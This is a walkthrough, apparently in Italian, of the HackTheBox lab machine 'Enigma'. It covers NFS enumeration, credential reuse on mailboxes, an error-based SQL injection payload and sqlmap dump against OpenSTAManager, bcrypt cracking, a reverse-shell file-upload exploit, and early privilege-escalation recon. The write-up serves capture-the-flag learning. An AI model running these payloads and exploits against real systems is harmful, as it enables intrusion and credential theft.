# Enigma
IP vittima: 10.129.4.97
IP attaccante: 10.10.14.241
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.25.59 -oG porte`
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-04 14:57 CEST
Initiating SYN Stealth Scan at 14:57
Scanning 10.129.25.59 [65535 ports]
Discovered open port 995/tcp on 10.129.25.59
Discovered open port 22/tcp on 10.129.25.59
Discovered open port 143/tcp on 10.129.25.59
Discovered open port 111/tcp on 10.129.25.59
Discovered open port 993/tcp on 10.129.25.59
Discovered open port 80/tcp on 10.129.25.59
Discovered open port 110/tcp on 10.129.25.59
Discovered open port 50633/tcp on 10.129.25.59
Discovered open port 46305/tcp on 10.129.25.59
Discovered open port 35289/tcp on 10.129.25.59
Discovered open port 42511/tcp on 10.129.25.59
Discovered open port 2049/tcp on 10.129.25.59
Discovered open port 60649/tcp on 10.129.25.59
Completed SYN Stealth Scan at 14:57, 10.81s elapsed (65535 total ports)
Nmap scan report for 10.129.25.59
Host is up, received user-set (0.026s latency).
Scanned at 2026-07-04 14:57:03 CEST for 10s
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
110/tcp   open  pop3    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
143/tcp   open  imap    syn-ack ttl 63
993/tcp   open  imaps   syn-ack ttl 63
995/tcp   open  pop3s   syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
35289/tcp open  unknown syn-ack ttl 63
42511/tcp open  unknown syn-ack ttl 63
46305/tcp open  unknown syn-ack ttl 63
50633/tcp open  unknown syn-ack ttl 63
60649/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
           Raw packets sent: 65549 (2.884MB) | Rcvd: 65535 (2.621MB)
```
### Ricognizione — Enigma (10.129.25.59)

**Metodologia.** Approccio standard a due fasi: prima uno SYN scan sull'intero range TCP (`-p-`) con `--min-rate 5000` per andare veloci e `-Pn` per saltare l'host discovery (obbligatorio in HTB, dove l'ICMP è filtrato). Poi uno scan mirato con `-sC -sV -O` solo sulle porte aperte per fingerprinting di versione e script di default. Ordine corretto: prima _cosa_ è aperto, poi _cosa gira_.

**Prima osservazione: due mondi distinti.** La superficie si divide nettamente in servizi "classici" (SSH, web, mail) e in tutto l'ecosistema RPC/NFS. Le tante porte alte apparentemente casuali (`35289`, `42511`, `46305`, `50633`, `60649`) non sono servizi misteriosi: il secondo scan le smaschera come `status`, `nlockmgr` e `mountd`, cioè i demoni ausiliari di NFS che `rpcbind` registra su porte dinamiche. Utile saperlo subito per non perderci tempo trattandole come vettori a sé.

**SSH (22).** OpenSSH 9.6p1 su `3ubuntu13.16` → Ubuntu 24.04. Aggiornato, nessun CVE banale: non è la porta d'ingresso, servirà arrivarci con credenziali recuperate altrove.

**HTTP (80).** nginx 1.24.0 che redirige a `http://enigma.htb/`. Primo passo obbligato: `enigma.htb` in `/etc/hosts`. Il redirect basato su hostname è anche un segnale che potrebbe esserci name-based virtual hosting, quindi vale un fuzzing di vhost/sottodomini oltre alla solita enumerazione di directory.

**Mail stack Dovecot (110/143/993/995).** Un mail server _completo_ — POP3 e IMAP entrambi in chiaro e su TLS — raramente è decorativo in una macchina HTB. Quasi sempre significa che a un certo punto leggeremo una casella di posta, tipicamente dopo aver recuperato delle credenziali. `STLS`/`STARTTLS` disponibili, certificato self-signed `commonName=enigma` emesso a febbraio 2026 con validità decennale (pattern tipico da lab, nessuna info utile lì). Lo tengo in caldo come _secondo stadio_ più che come punto di partenza.

**NFS (111 + 2049).** Questo è il pezzo più interessante in fase di enumerazione, ed è dove partirei per primo. `rpcinfo` conferma `nfs` e `nfs_acl` esposti. Priorità:

- `showmount -e 10.129.25.59` per elencare gli export;
- montare ciò che è accessibile e cercare file leggibili — chiavi SSH, home, e soprattutto lo spool di posta (`/var/mail`), che legherebbe direttamente NFS e il mail stack di sopra.

La combinazione NFS + mail server non è casuale: il flusso plausibile è _NFS → recupero credenziali/mailbox → lettura posta → accesso_.

**OS.** TTL 63 (64 originale, 2 hop via VPN), fingerprint Linux 4/5 coerente con l'Ubuntu 24.04 già dedotto da SSH.
## NFS
### Enumerazione NFS

**Export disponibili.**

```bash
showmount -e 10.129.25.59
/srv/nfs/onboarding *
```

Un solo export, `/srv/nfs/onboarding`, esposto a `*` — cioè a chiunque, nessuna restrizione per IP. Il nome è già un indizio narrativo: "onboarding" richiama la fase di inserimento di un nuovo dipendente, e combacia con il mail server visto in fase di scan (un neoassunto → una casella di posta da configurare).

**Mount e ispezione.**

```bash
mkdir -p /tmp/enigma_nfs
sudo mount -t nfs 10.129.25.59:/srv/nfs/onboarding /tmp/enigma_nfs -o nolock
ls -la /tmp/enigma_nfs
```

```
drwxr-xr-x root root 4.0 KB  Feb 19 20:54  .
drwxrwxrwt root root 420 B   Jul  4 15:18  ..
.rw-r--r-- root root 1.7 KB  Feb 19 20:53  New_Employee_Access.pdf
```

L'export contiene un solo file: `New_Employee_Access.pdf`. Un paio di osservazioni utili:

- **Permessi.** Il file è `root:root` con `-rw-r--r--`, quindi world-readable: nessun gioco di UID-spoofing necessario qui (a differenza del caso classico in cui un file è leggibile solo dal proprietario e devi allineare l'UID lato client). Lo leggiamo direttamente.
- **Coerenza temporale.** Il PDF è datato 19 febbraio 2026, stessa finestra del certificato TLS del mail server (`Not valid before: 2026-02-18`). Sono artefatti creati insieme durante il setup della macchina: rafforza l'ipotesi che il documento serva proprio a introdurre l'accesso al sistema di posta.

Un documento intitolato "New Employee Access" su un onboarding share, accanto a un mail stack Dovecot completo, punta con forza a una policy di accesso: credenziali di default, formato username, o istruzioni per il primo login. È il tipo di file che contiene il primo appiglio.
### Lettura del documento di onboarding

```bash
cp /tmp/enigma_nfs/New_Employee_Access.pdf ~/macchine/hackthebox/enigma # copiamo il file nella cartella di lavoro
pdftotext New_Employee_Access.pdf # estrae il testo dal pdf
cat --plain New_Employee_Access.txt
```
```
Enigma Corp
IT Department - New Employee System Access

Employee:

Kevin Mitchell

Department:

Operations

Provisioned by:

IT Department

Date:

2024-03-01

Webmail Access
URL:

http://mail001.enigma.htb

Username:

kevin

Password:

Enigma2024!

Please change your password upon first login.
For support contact: it@enigma.htb
This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.

^L
```

Il PDF è un modulo di provisioning IT di "Enigma Corp" per un nuovo dipendente. I dati rilevanti:

|Campo|Valore|
|---|---|
|Employee|Kevin Mitchell|
|Webmail URL|`http://mail001.enigma.htb`|
|Username|`kevin`|
|Password|`Enigma2024!`|
Bottino significativo in un colpo solo. Tre elementi da capitalizzare:

**1. Una coppia di credenziali.** `kevin:Enigma2024!` — la password è quella provvisoria assegnata al primo accesso. Il documento invita a cambiarla al primo login, ma questa è esattamente il tipo di raccomandazione che nei lab (e nella realtà) viene ignorata: c'è una buona probabilità che sia ancora valida.

**2. Un nuovo vhost.** `mail001.enigma.htb`. La scommessa sul virtual hosting fatta in fase di scan si conferma: esiste almeno un sottodominio oltre a `enigma.htb`, e ospita una **webmail**. Va aggiunto subito a `/etc/hosts`:

```bash
echo "10.129.25.59 enigma.htb mail001.enigma.htb" | sudo tee -a /etc/hosts
```

**3. Una naming convention.** Username = nome proprio in minuscolo (`kevin`), dominio mail `@enigma.htb`, contatto `it@enigma.htb`. Se più avanti servisse enumerare o spruzzare altri account, il formato è `<firstname>`.

**Come si incastra tutto.** Il quadro visto allo scan ora ha un senso lineare: l'export NFS "onboarding" era il punto d'ingresso _by design_ — consegna credenziali → quelle credenziali aprono il mail stack Dovecot → la webmail su `mail001` è l'interfaccia per leggerlo. NFS e mail server non erano due vettori separati ma due anelli della stessa catena.

**Prossimi passi.** Due strade da provare in parallelo, in ordine di rumore crescente:

- **Webmail:** aprire `http://mail001.enigma.htb`, identificare la piattaforma (Roundcube, SquirrelMail, ecc. — occhio alla versione, spesso è lì il CVE) e autenticarsi con `kevin:Enigma2024!`.
- **POP3/IMAP diretti:** validare le credenziali contro Dovecot senza passare dal browser, utile per leggere la mailbox da CLI:

```bash
curl -k 'pop3s://10.129.25.59' --user 'kevin:Enigma2024!'
# oppure IMAP
curl -k 'imaps://10.129.25.59' --user 'kevin:Enigma2024!'
```
## Mailbox
### Accesso alla mailbox

```bash
curl -k 'pop3s://10.129.25.59' --user 'kevin:Enigma2024!'
1 1473
```

```bash
curl -k 'imaps://10.129.25.59' --user 'kevin:Enigma2024!'
* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
* LIST (\NoInferiors \UnMarked \Trash) "/" Trash
* LIST (\HasNoChildren) "/" INBOX
```

La password provvisoria del PDF è ancora attiva: la raccomandazione "change your password upon first login" è stata ignorata, come previsto. POP3 vede **un** messaggio (1473 byte) nell'INBOX; IMAP conferma tre cartelle — `INBOX`, `Sent`, `Trash`.

Nota di metodo: POP3 espone solo l'INBOX, quindi quel singolo messaggio è tutto ciò che vede. IMAP invece mostra anche `Sent` e `Trash`, ed è lì che spesso si nasconde la roba interessante — la posta inviata e soprattutto il **cestino**, dove finiscono i messaggi che qualcuno ha "eliminato" ma che restano leggibili. Vanno controllate tutte e tre, non solo l'INBOX.

**Lettura dei messaggi.** Il modo più rapido è scaricare direttamente il contenuto. Partiamo dall'INBOX via POP3, che è immediato:
`curl -k 'pop3s://10.129.25.59/1' --user 'kevin:Enigma2024!'`
```
Return-Path: <sarah@enigma.htb>
X-Original-To: kevin@localhost
Delivered-To: kevin@localhost
Received: from enigma (localhost [127.0.0.1])
	by enigma (Postfix) with ESMTP id 673F7211B9
	for <kevin@localhost>; Wed, 18 Feb 2026 21:29:13 +0000 (UTC)
Date: Wed, 18 Feb 2026 21:29:13 +0000
To: kevin@localhost
From: sarah@enigma.htb
Subject: Welcome to Enigma Corp, Kevin!
Message-Id: <20260218212913.010896@enigma>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

Hi Kevin,

Welcome to the team! We're thrilled to have you on board at Enigma Corp.

A little about us — Enigma Corp is a mid-sized technology and operations firm specializing in infrastructure management and enterprise solutions. We've been growing rapidly over the past few years and we're excited to have fresh talent joining us.

I'm Sarah from the Accounts department. I'll be your point of contact for any finance-related queries during your onboarding period.

We're still finalizing a few of your onboarding details — your system access, equipment setup, and department introductions are all being arranged by the IT team. You should be receiving your access credentials shortly via the company shared drive.

In the meantime, don't hesitate to reach out if you have any questions. We want to make sure your first few days are as smooth as possible.

Looking forward to working with you!

Best regards,
Sarah
Accounts Department
Enigma Corp
sarah@enigma.htb
```
Il singolo messaggio è una mail di benvenuto da `sarah@enigma.htb` (Accounts Department) a `kevin`. Contenuto per lo più narrativo, ma un paio di dati vanno estratti:

- **Nuovo utente: `sarah`.** Mittente `sarah@enigma.htb`, reparto Accounts. Con la naming convention già dedotta dal PDF (`<firstname>` in minuscolo), l'account candidato è `sarah`. È il secondo nome reale che raccogliamo — va tenuto nella lista degli utenti da provare.
- **Header `Received`.** La mail è stata consegnata `from enigma (localhost [127.0.0.1]) by enigma (Postfix)`: conferma che c'è un **Postfix** locale come MTA dietro Dovecot, e che la posta viene iniettata da localhost. Coerente con un ambiente dove i messaggi sono generati internamente.
- **`X-Mailer: swaks`.** Il messaggio è stato spedito con `swaks` (Swiss Army Knife for SMTP), un tool da riga di comando. Non è un client "umano": è il modo in cui l'autore del box ha seminato le mail durante il setup. Dettaglio di colore, non azionabile, ma spiega la genesi artificiale del contenuto.

**Il vero indizio è nel testo**, non negli header:

> _"You should be receiving your access credentials shortly **via the company shared drive**."_

Questo è un puntatore esplicito. Il messaggio dice che le credenziali arrivano tramite lo _shared drive_ aziendale — e uno shared drive noi lo abbiamo già visto: l'export **NFS** `/srv/nfs/onboarding`. La narrazione chiude il cerchio con la fase di enumerazione iniziale. Ma lì dentro abbiamo trovato _solo_ il PDF di Kevin. Due letture possibili:

1. lo share NFS è statico e quel PDF era tutto (probabile, in questo caso il filo prosegue altrove — es. la webmail o le altre cartelle IMAP);
2. potrebbero esistere altri file o altri percorsi non ancora visti.

**Cosa resta da controllare subito**, prima di allargare il tiro:

- **`Sent` e `Trash` via IMAP.** POP3 vede solo l'INBOX. Le cartelle `Sent` e `Trash` che IMAP ci ha mostrato non le abbiamo ancora aperte, ed è dove tipicamente si trova la corrispondenza più succosa (magari mail _di_ Kevin verso altri, o messaggi cestinati con credenziali).
- **La webmail su `mail001.enigma.htb`.** Ancora inesplorata: identificarne piattaforma e versione resta prioritario, sia come possibile CVE sia perché con `kevin:Enigma2024!` ci si autentica di sicuro.
### Controllo Sent e Trash
```
❯ curl -k 'imaps://10.129.25.59/INBOX?ALL' --user 'kevin:Enigma2024!'
* SEARCH 1
❯ curl -k 'imaps://10.129.25.59/Sent?ALL'  --user 'kevin:Enigma2024!'
* SEARCH
❯ curl -k 'imaps://10.129.25.59/Trash?ALL' --user 'kevin:Enigma2024!'
* SEARCH
```
La risposta `SEARCH` di IMAP restituisce gli UID che matchano il criterio (`ALL` = tutti). L'esito è netto:

- **INBOX** → `* SEARCH 1`: un solo messaggio, l'UID 1, cioè la mail di benvenuto di Sarah già letta.
- **Sent** → `* SEARCH` senza UID: **vuota**.
- **Trash** → `* SEARCH` senza UID: **vuota**.

La mailbox di Kevin è quindi completamente esaurita: niente di nuovo in `Sent` né `Trash`. Il ramo POP3/IMAP ci ha dato ciò che poteva — una coppia di credenziali valide (`kevin:Enigma2024!`) e un secondo nome utente (`sarah`) — e la mail stessa ci ha indicato dove guardare: la webmail.

**Bilancio di questa fase.** Il mail server non era la destinazione ma un anello: ha confermato le credenziali di Kevin e introdotto `sarah`. Da qui il percorso naturale è la **webmail su `mail001.enigma.htb`**, l'unico vettore citato esplicitamente e ancora inesplorato. Due ragioni per cui è il prossimo passo giusto:

1. con `kevin:Enigma2024!` l'autenticazione è garantita, quindi accediamo a un'applicazione web _autenticata_ — superficie molto più ampia di POP3/IMAP;
2. la versione della piattaforma (Roundcube, SquirrelMail, ecc.) è spesso il punto in cui si innesta un CVE per arrivare a RCE o a lettura file.
### Webmail su mail001.enigma.htb
 
  Invece di autenticarci su `mail001.enigma.htb` con `kevin:Enigma2024!` proviamo usando la stessa password su l'utente sarah: `kevin:Enigma2024!`

Riusciamo ad autenticarci con sarah e troviamo questa mail:
```
Hi Sarah,  
  
Apologies for the delay. I have provisioned your access. Please find the details below:  
  
URL: [http://support_001.enigma.htb](http://support_001.enigma.htb)  
Username: admin  
Password: Ne3s4rtars78s  
  
Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.  
  
Regards,  
IT Support  
Enigma Corp
```

Invece di fermarsi a Kevin, tentativo di login su Dovecot come **`sarah`** riutilizzando la stessa password `Enigma2024!` → **successo**. Il riuso di credenziali tra utenti è esattamente il tipo di scommessa che vale sempre la pena fare in questi contesti: la password provvisoria assegnata dall'IT è la stessa per tutti gli account di onboarding, e nessuno l'ha cambiata.

Da notare metodologicamente: `sarah` era emersa solo come _mittente_ nella mail di benvenuto a Kevin. Averla trattata come utente enumerabile — e non come semplice dettaglio narrativo — è ciò che ha sbloccato il passo. Naming convention `<firstname>` + password condivisa = accesso.

**Contenuto rilevante nella casella di Sarah:**

Una mail dall'IT Support che le provisiona un accesso a un nuovo servizio:

| Campo    | Valore                          |
| -------- | ------------------------------- |
| URL      | `http://support_001.enigma.htb` |
| Username | `admin`                         |
| Password | `Ne3s4rtars78s`                 |
Bottino considerevole. Tre cose:

**1. Un terzo vhost: `support_001.enigma.htb`.** Un altro sottodominio, questa volta un sistema di **supporto/ticketing** (il nome lo suggerisce). Da aggiungere subito a `/etc/hosts`:

bash

```bash
echo "10.129.25.59 enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts
```

Nota: l'underscore in `support_001` non è un hostname DNS valido in senso stretto, ma per la risoluzione via `/etc/hosts` + `Host` header su HTTP funziona senza problemi — nginx fa il routing sul valore dell'header, non serve un record DNS regolare.

**2. Credenziali di admin.** `admin:Ne3s4rtars78s` — e stavolta è un account **amministrativo**, non un semplice utente. La mail stessa lo dice esplicitamente: _"for now you can use the admin account to get started"_. Un account admin condiviso, temporaneo, mai revocato: superficie ideale.

**3. La catena si estende.** Il percorso finora è pulito e lineare:

`NFS (onboarding) → cred Kevin → mail → riuso password su Sarah → mail → admin del sistema di support`

Ogni servizio ha consegnato la chiave del successivo. Il mail stack, che allo scan sembrava un vettore a sé, si è rivelato il perno che collega NFS all'applicazione web finale.
## Servizio OpenSTAManager su support_001.enigma.htb

Accediamo al servizio presente in `http://support_001.enigma.htb` con username `admin` e password `Ne3s4rtars78s`
Troviamo il servizio `OpenSTAManager` versione `2.9.8`
![[Pasted image 20260704162012.png]]
### Fingerprint dell'applicazione: OpenSTAManager 2.9.8

Il servizio su `support_001.enigma.htb` è **OpenSTAManager 2.9.8**, un gestionale open-source italiano (fatturazione, assistenza, magazzino). Accesso già ottenuto come `admin:Ne3s4rtars78s`, quindi partiamo _autenticati_ — condizione che sblocca il grosso delle vulnerabilità note su questa versione.

La 2.9.8 è un colabrodo: c'è un intero cluster di CVE del 2026 scoperte da Lukasz Rybak, quasi tutte SQL injection autenticate. Le rilevanti:

| CVE            | Tipo                                      | Endpoint / parametro                       |
| -------------- | ----------------------------------------- | ------------------------------------------ |
| CVE-2026-24417 | Time-based blind SQLi                     | `ajax_search.php`, parametro `term`        |
| CVE-2026-24418 | **Error-based SQLi** (XPATH/EXTRACTVALUE) | `actions.php?id_module=18`, `id_records[]` |
| CVE-2025-69212 | Time-based blind SQLi                     | `ajax_select.php`, `options[matricola]`    |
| CVE-2026-27012 | Privilege escalation / auth bypass        | `modules/utenti/actions.php`, `idgruppo`   |
**Quale scegliere e perché.** Il flag "user" richiede quasi sempre credenziali di sistema, e la via più diretta è estrarre gli hash degli utenti applicativi dal DB per poi crackarli o riusarli. Tra le SQLi, la **CVE-2026-24418** (Scadenzario, error-based) è la più comoda: essendo error-based via messaggi XPATH, restituisce i dati direttamente nella risposta HTTP, senza la lentezza dell'inferenza time-based.
### CVE-2026-24418
Usiamo questo POC:
https://github.com/BridgerAlderson/CVE-2026-24418
Installazione dell'exploit:
```
git clone https://github.com/BridgerAlderson/CVE-2026-24418.git
cd CVE-2026-24418
python3 -m venv venv
source venv/bin/activate
pip install requests
```
Login con credenziali
`python3 exploit.py -t http://support_001.enigma.htb -u admin -p Ne3s4rtars78s --info`
``` bash
  _______      ________    ___   ___ ___   __      ___  _  _   _  _  __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \ / /     |__ \| || | | || |/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) / /_ ______ ) | || |_| || |_| | (_) |
| |      \ \/ / |  __|______/ /| | | |/ / '_ \______/ /|__   _|__   _| |> _ < 
| |____   \  /  | |____    / /_| |_| / /| (_) |    / /_   | |    | | | | (_) |
 \_____|   \/   |______|  |____|\___/____\___/    |____|  |_|    |_| |_|\___/ 

    OpenSTAManager <= 2.9.8  |  Error-Based SQL Injection
    Scadenzario send_reminder id_records[] Parameter

  github.com/BridgerAlderson

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [*] Authenticating as admin
  [+] Authenticated successfully
   └─ PHPSESSID: cqa0u1c61if398cganfgvnojkn
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ══════════════════════════════════════════════════════════════
  ║ DATABASE INFORMATION
  ══════════════════════════════════════════════════════════════
   ├─ Version: 8.0.46-0ubuntu0.24.04.3
   ├─ Current User: brollin@localhost
   ├─ Database: openstamanager
   ├─ Hostname: enigma
   ├─ Data Directory: /var/lib/mysql/
   ├─ OS: Linux
   └─ Basedir: /usr/
  ══════════════════════════════════════════════════════════════


  ─── Stats: 7 requests in 1.0s ───
```
Esfiltrazione informazioni: Database info + privileges + user credentials
`python3 exploit.py -t http://support_001.enigma.htb -u admin -p Ne3s4rtars78s --all`
```
  _______      ________    ___   ___ ___   __      ___  _  _   _  _  __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \ / /     |__ \| || | | || |/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) / /_ ______ ) | || |_| || |_| | (_) |
| |      \ \/ / |  __|______/ /| | | |/ / '_ \______/ /|__   _|__   _| |> _ < 
| |____   \  /  | |____    / /_| |_| / /| (_) |    / /_   | |    | | | | (_) |
 \_____|   \/   |______|  |____|\___/____\___/    |____|  |_|    |_| |_|\___/ 

    OpenSTAManager <= 2.9.8  |  Error-Based SQL Injection
    Scadenzario send_reminder id_records[] Parameter

  github.com/BridgerAlderson

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [*] Authenticating as admin
  [+] Authenticated successfully
   └─ PHPSESSID: fv21n2v1nmjddc659sqtvnk7j0
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ══════════════════════════════════════════════════════════════
  ║ DATABASE INFORMATION
  ══════════════════════════════════════════════════════════════
   ├─ Version: 8.0.46-0ubuntu0.24.04.3
   ├─ Current User: brollin@localhost
   ├─ Database: openstamanager
   ├─ Hostname: enigma
   ├─ Data Directory: /var/lib/mysql/
   ├─ OS: Linux
   └─ Basedir: /usr/
  ══════════════════════════════════════════════════════════════


  ══════════════════════════════════════════════════════════════
  ║ PRIVILEGE ENUMERATION
  ══════════════════════════════════════════════════════════════
   ├─ Current User: brollin@localhost
   ├─ FILE: NO
   ├─ SUPER: NO
   ├─ PROCESS: NO
   └─ All Grants: USAGE
  ══════════════════════════════════════════════════════════════
  [!] FILE privilege not detected. File operations may fail.

  [*] Found 2 user(s) in zz_users

  ══════════════════════════════════════════════════════════════
  ║ CREDENTIAL DUMP ─ zz_users
  ══════════════════════════════════════════════════════════════

  ┌────────────────────────────────────────────────────────────┐
  │  User #1
  ├────────────────────────────────────────────────────────────┤
   ├─ ID: 1
   ├─ Username: admin
   ├─ Email: admin@enigma.htb
   ├─ Enabled: 1
   └─ Hash: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
  └────────────────────────────────────────────────────────────┘

  ┌────────────────────────────────────────────────────────────┐
  │  User #2
  ├────────────────────────────────────────────────────────────┤
   ├─ ID: 2
   ├─ Username: haris
   ├─ Email: haris@enigma.htb
   ├─ Enabled: 1
   └─ Hash: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
  └────────────────────────────────────────────────────────────┘

  ══════════════════════════════════════════════════════════════

  [*] Crack with: hashcat -m 3200 hashes_hashcat.txt wordlist.txt
  [*] Crack with: john --format=bcrypt hashes_john.txt --wordlist=wordlist.txt

  ─── Stats: 27 requests in 4.1s ───
```
Troviamo 2 utenti: admin che conosciamo già e `haris` con il suo hash:
`$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC`
Che possiamo provare a craccare.

> [!NOTE] **Exploit manuale**
> L'esfiltrazione poteva essere effettuata manualmente in questo modo:
> 1) Ottenere il cookie di sessione dal browser (già loggato come admin):
> - Nel browser F12 per aprire i Web Developer Tools
> - In Storage - Cookies prendere il valore del cookie PHPSESSID
> 2) Salvare il valore del cookie in una variabile:
> - COOKIE="PHPSESSID=<il_tuo_session_id>"
> 3) Lanciare il comando:
> ```
> curl -s -b "$COOKIE" \
  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,email) FROM zz_users LIMIT 1)))#" \
  "http://support_001.enigma.htb/actions.php?id_module=18"
> ```
> Se nella risposta compare un errore XPATH del tipo `XPATH syntax error: '~root@localhost|10.x...'`, l'iniezione è confermata. Infatti otteniamo:
> ```
> Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#039;~admin:admin@enigma.htb&#039;
> ```
> Il payload `EXTRACTVALUE` ha funzionato: il `~` (il nostro `0x7e`) delimita il dato esfiltrato, e leggiamo `admin:admin@enigma.htb` — cioè `username:email` del primo record di `zz_users`. La vulnerabilità è verificata e restituisce dati direttamente in risposta.
> A questo punto, sqlmap è la scelta sensata.
> ```
> sqlmap -u "http://support_001.enigma.htb/actions.php?id_module=18" \
  --cookie="$COOKIE" \
  --data="op=send_reminder&id_records[]=1" \
  -p "id_records[]" \
  --dbms=mysql --technique=E --batch \
  -T zz_users --dump
> ```
> Otteniamo gli user **admin** e **haris** che le relative hash  già individuate con l'exploit:
> ```
> +----+----------+--------------+---------------+------------------+---------+--------------------------------------------------------------+----------+-----------+---------------------+---------------------+-------------+
| id | idgruppo | idanagrafica | image_file_id | email            | enabled | password                                                     | username | options   | created_at          | updated_at          | reset_token |
+----+----------+--------------+---------------+------------------+---------+--------------------------------------------------------------+----------+-----------+---------------------+---------------------+-------------+
| 1  | 1        | 1            | NULL          | admin@enigma.htb | 1       | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin    | <blank>   | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |
| 2  | 5        | 1            | NULL          | haris@enigma.htb | 1       | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris    | <blank>   | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |
+----+----------+--------------+---------------+------------------+---------+--------------------------------------------------------------+----------+-----------+---------------------+---------------------+-------------+
> ```
### Crack degli hash
Salviamo la hash di **haris** in un file:
```
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
```
Poi possiamo usare [[johntheripper]]o [[hashcat]]:
`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash`
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bestfriends      (?)     
1g 0:00:00:01 DONE (2026-07-05 09:34) 0.5102g/s 367.3p/s 367.3c/s 367.3C/s gloria..marissa
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt`
```
... snip
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNp...ZDr6eC
... snip
```
Per lo user **haris** otteniamo la password **bestfriends**
### CVE-2026-38751
L'utente trovato non consente accesso a SSH che richiede una chiave. Sfruttiamo ancora le vulenrabilità di **OpenSTAManager** per ottenere una shell.
**Il vettore giusto: upload di modulo malevolo (CVE-2026-38751).** OpenSTAManager permette di installare "moduli/componenti" caricando un archivio ZIP tramite il meccanismo di aggiornamento. Il difetto è un **path traversal nel campo `directory`** del componente ZIP: si confeziona uno ZIP con un descrittore di modulo valido e dentro una **PHP webshell**, lo si carica come admin, e il file PHP finisce in una directory servita dal webserver. Il risultato è esecuzione di codice come **`www-data`**. È il percorso più diretto e pulito per il foothold: da admin applicativo a shell sul sistema.

Utilizziamo questo POC:
https://github.com/Mkps/CVE-2026-38751-OpenSTAManager-Arbitrary-File-Upload-PoC

> Dopo aver clonato la repository occorre correggere un errore nello script. Occorre aggiungere questo import:
> `from itertools import count`

L'utilizzo dell'exploit è il seguente:
```
usage: OpenSTAManager-CVE-2026-38751 [-h] [--lhost LHOST] [--lport LPORT] username password target_url
```
quindi mettiamo in ascolto sulla porta 4444 con
`nc -nlvp 4444`
e lanciamo:
```
python cve-2026-38751.py --lhost 10.10.14.241 --lport 4444 admin Ne3s4rtars78s http://support_001.enigma.htb
```
Ottenendo una shell con l'utente **www-data**
## Utente haris
Dopo aver sistemato la shell con:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# premi Ctrl+z per sospendere la shell poi:
stty raw -echo; fg 
export TERM=xterm
```
Utilizziamo le credenziali dell'utente haris trovate prima (**haris:bestfriends**)
`su haris -> password: bestfriends`
Nella cartella `/home/haris` troviamo la user flag.
## Scalata dei privilegi
Lanciamo i consueti comandi per trovare una via a root:
``` bash
sudo -l # è un vicolo cieco (`haris` non è nei sudoers)

ss -tlnp # troviamo ... LISTEN 0 4096 127.0.0.1:1337 0.0.0.0:* ...

find / -perm -4000 -type f 2>/dev/null # i SUID sono tutti standard e nessun cron interessante

ps aux | grep -i root | grep -v '\[' # troviamo ... root        1483  0.0  0.3 1238736 14976 ?       Ssl  Jul04   0:00 /usr/local/bin/OliveTin ...
```

Tra i processi root spicca l'elemento fuori posto:

```
root  1483  ...  /usr/local/bin/OliveTin
```

E incrociando con `ss -tlnp`, c'è un servizio in ascolto solo su localhost che dall'esterno non vedevamo:

```
LISTEN  127.0.0.1:1337
```

